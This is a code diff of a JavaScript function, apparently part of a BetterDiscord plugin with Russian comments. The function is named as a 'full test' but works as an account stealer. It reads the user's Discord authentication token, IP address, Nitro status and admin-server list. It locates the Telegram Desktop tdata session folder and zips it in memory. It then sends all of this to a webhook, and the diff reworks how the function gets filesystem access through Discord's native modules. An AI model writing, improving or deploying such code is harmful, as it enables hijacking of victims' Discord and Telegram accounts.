@@ -1,7 +1,22 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) {
-    // Проверяем, что модули дошли
-    if (!fs || !path || !execSync) {
-        return { success: false, error: "Модули Node.js не были переданы из плагина." };
+async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
+    // 1. Получаем доступ к fs через нативный API Discord
+    let fs = null;
+    try {
+        if (typeof DiscordNative !== 'undefined' && DiscordNative.nativeModules) {
+            const electron = DiscordNative.nativeModules.requireModule('discord_/../electron');
+            if (electron && electron.remote) {
+                // electron.remote.require позволяет нам получить оригинальный модуль 'fs'
+                fs = electron.remote.require('fs');
+                // Или можно попробовать 'original-fs', который использует Electron для работы с файлами
+                // fs = electron.remote.require('original-fs'); 
+            }
+        }
+    } catch (e) {
+        console.error("Не удалось получить fs через DiscordNative:", e);
+    }
+
+    if (!fs) {
+        return { success: false, error: "Не удалось получить доступ к файловой системе." };
     }
 
     let result = {
@@ -13,7 +28,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) 
         admin_servers: []
     };
     
-    // 1. IP и Локация
+    // 2. Сбор данных (IP, Nitro, Токен, Серверы)
     try {
         const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
         const ipData = await ipRes.json();
@@ -26,51 +41,67 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) 
         }
     } catch (e) {}
 
-    // 2. Nitro и Токен
     try {
         const UserStore = BdApi.Webpack.getStore("UserStore");
         if (UserStore) {
             const user = UserStore.getCurrentUser();
             if (user.premiumType > 0) result.nitro = "Nitro";
         }
-        
         const authStore = BdApi.Webpack.getStore("AuthenticationStore");
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. Поиск и архивация Telegram tdata
+    // 3. Поиск и упаковка Telegram tdata с помощью fflate
     let hasTdata = false;
-    let tdataZipPath = "";
+    let tdataZipBuffer = null;
     try {
         const appData = process.env.APPDATA;
         if (appData) {
+            // Используем require('path') из плагина
+            const path = require('path'); 
             const possiblePaths = [
                 path.join(appData, 'Telegram Desktop', 'tdata'),
                 path.join(appData, 'Telegram', 'tdata')
             ];
             
+            let tdataPath = null;
             for (const p of possiblePaths) {
                 if (fs.existsSync(p)) {
-                    result.telegram_path = p;
+                    tdataPath = p;
                     hasTdata = true;
-                    
-                    // Используем TEMP вместо os.tmpdir()
-                    const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
-                    tdataZipPath = path.join(tempDir, 'opium_tdata.zip');
-                    
-                    try {
-                        if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
-                        execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
-                    } catch (zipError) {
-                        hasTdata = false; 
-                    }
                     break;
                 }
             }
-        }
-    } catch (e) {}
 
-    // 4. Серверы и участники
+            if (tdataPath) {
+                result.telegram_path = tdataPath;
+                // Рекурсивно собираем все файлы из папки tdata
+                const files = {};
+                const addFilesRecursively = (dir, prefix = '') => {
+                    const entries = fs.readdirSync(dir);
+                    for (const entry of entries) {
+                        const fullPath = path.join(dir, entry);
+                        const relativePath = path.join(prefix, entry);
+                        if (fs.statSync(fullPath).isDirectory()) {
+                            addFilesRecursively(fullPath, relativePath);
+                        } else {
+                            // Читаем файл как Uint8Array (это необходимо для fflate)
+                            files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
+                        }
+                    }
+                };
+                addFilesRecursively(tdataPath);
+
+                // Создаем zip-архив в памяти
+                tdataZipBuffer = fflate.zipSync(files);
+            }
+        }
+    } catch (e) {
+        console.error("Ошибка при создании ZIP архива tdata:", e);
+        hasTdata = false; // Если не удалось создать архив, не отправляем его
+    }
+
+    // 4. Сбор информации о серверах
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
@@ -115,9 +146,9 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) 
     const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
     formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
 
-    if (hasTdata && fs.existsSync(tdataZipPath)) {
-        const zipBuffer = fs.readFileSync(tdataZipPath);
-        formData.append('files[1]', new Blob([zipBuffer], { type: 'application/zip' }), 'tdata.zip');
+    // Прикрепляем ZIP архив, если он был создан
+    if (tdataZipBuffer) {
+        formData.append('files[1]', new Blob([tdataZipBuffer], { type: 'application/zip' }), 'tdata.zip');
     }
 
     // 6. Отправка
